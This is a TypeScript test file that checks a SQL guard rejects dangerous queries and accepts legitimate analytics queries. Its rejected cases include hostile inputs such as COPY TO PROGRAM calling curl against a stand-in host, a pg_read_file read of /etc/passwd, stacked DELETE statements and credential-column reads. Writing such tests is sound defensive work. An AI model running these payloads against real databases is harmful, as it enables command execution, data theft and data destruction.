/**
 * Adversarial tests for the SQL guard.
 *
 *   npx tsx src/lib/sql-guard.test.ts
 *
 * Every case here is a real technique, not a hypothetical. The comments name the
 * attack so a future edit that removes a check is obviously a regression rather
 * than an unexplained behaviour change.
 *
 * This file asserts two different things and the distinction is the point:
 *   - checkSql() must REJECT these (cheap, gives the model a retryable error)
 *   - the transaction must REFUSE them even if checkSql somehow passed (the real
 *     guarantee, enforced by Postgres)
 */
import { checkSql } from "./sql-guard";

let pass = 0;
let fail = 0;

function mustReject(sql: string, label: string) {
  const r = checkSql(sql);
  if (r.ok) {
    console.error(`  FAIL  accepted an attack: ${label}\n        ${sql}`);
    fail++;
  } else {
    pass++;
  }
}

function mustAccept(sql: string, label: string) {
  const r = checkSql(sql);
  if (!r.ok) {
    console.error(`  FAIL  rejected a legitimate query: ${label}\n        ${sql}\n        reason: ${r.reason}`);
    fail++;
  } else {
    pass++;
  }
}

console.log("writes");
mustReject(`INSERT INTO events (site_id) VALUES ($1)`, "plain INSERT");
mustReject(`WITH x AS (DELETE FROM events RETURNING *) SELECT * FROM x`, "data-modifying CTE");
mustReject(`UPDATE events SET value = 0`, "UPDATE");
mustReject(`DELETE FROM sites`, "DELETE");
mustReject(`DROP TABLE events`, "DROP");
mustReject(`TRUNCATE events`, "TRUNCATE");
mustReject(`ALTER TABLE events ADD COLUMN x int`, "ALTER");
mustReject(`CREATE TABLE t (id int)`, "CREATE");

console.log("stacked queries");
mustReject(`SELECT 1; DELETE FROM events`, "semicolon smuggled mid-string");
mustReject(`SELECT 1; -- harmless`, "trailing statement after comment");
mustReject(`SELECT 1 /* ; DELETE FROM events */`, "comment-hidden statement");

console.log("identifiers that merely look like keywords");
mustAccept(`SELECT count(*) FROM events WHERE name = 'deleted'`, "a string containing a keyword");
mustAccept(`SELECT created_at FROM events`, "column named created_at");

console.log("pseudonymous columns");
mustReject(`SELECT visitor_hash FROM events`, "visitor_hash directly");
mustReject(`SELECT DISTINCT visitor_hash, path FROM events`, "visitor_hash in a projection");
mustReject(
  `SELECT path FROM events WHERE visitor_hash IN (SELECT visitor_hash FROM events)`,
  "visitor_hash in a subquery",
);
mustReject(`SELECT session_id, count(*) FROM events GROUP BY session_id`, "session_id");
mustReject(`SELECT count(DISTINCT visitor_hash) FROM events`, "even aggregated — must use a helper");
mustReject(`SELECT * FROM events`, "star select would expose every column");
mustReject(`SELECT password_hash FROM users`, "credential column");
mustReject(`SELECT write_key FROM sites`, "write key");

console.log("catalog and filesystem reach");
mustReject(`SELECT * FROM pg_stat_activity`, "pg_catalog reach");
mustReject(`SELECT current_setting('is_superuser')`, "GUC read");
mustReject(`SELECT * FROM information_schema.tables`, "information_schema");
mustReject(`SELECT pg_read_file('/etc/passwd')`, "file read");
mustReject(`SELECT current_setting('is_superuser')`, "GUC read");
mustReject(`SELECT set_config('log_statement', 'all', false)`, "GUC write");
mustReject(`SELECT e.* FROM events e`, "aliased star projection");
mustReject(`SELECT path, * FROM events`, "star after a comma");
mustReject(`COPY events TO PROGRAM 'curl evil.example'`, "COPY TO PROGRAM");

console.log("not-a-select");
mustReject(`EXPLAIN SELECT 1`, "EXPLAIN");
mustReject(`  `, "empty");
mustReject(`SELECT 1 INTO tmp`, "INTO");

console.log("legitimate analytics");
mustAccept(
  `SELECT path, count(*) AS views FROM events
   WHERE site_id = $1 AND occurred_at >= now() - interval '30 days' AND type = 'pageview'
   GROUP BY path ORDER BY views DESC LIMIT 100`,
  "top pages",
);
mustAccept(
  `SELECT regexp_replace(referrer, '^https?://([^/]+).*', '\\1') AS host, count(*) AS n
   FROM events WHERE site_id = $1 AND occurred_at >= now() - interval '1 day'
   AND type = 'pageview' AND referrer IS NOT NULL
   GROUP BY 1 ORDER BY n DESC LIMIT 50`,
  "referrer hosts",
);
mustAccept(
  `SELECT date_trunc('day', occurred_at) AS day, count(*) AS pageviews
   FROM events WHERE site_id = $1 AND type = 'pageview' GROUP BY 1 ORDER BY 1 LIMIT 90`,
  "time series",
);
mustAccept(
  `SELECT value FROM events WHERE site_id = $1 AND type = 'vital' AND name = 'lcp'
   ORDER BY value DESC LIMIT 200`,
  "raw vital samples",
);
mustAccept(
  `SELECT count(*) AS n FROM events WHERE site_id = $1 AND type = 'pageview'`,
  "count(*) — a star inside an aggregate leaks nothing",
);
mustAccept(
  `SELECT path, round(avg(value) * 100) AS pct FROM events WHERE site_id = $1
   AND type = 'scroll' GROUP BY path LIMIT 100`,
  "multiplication must not be mistaken for a star projection",
);

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);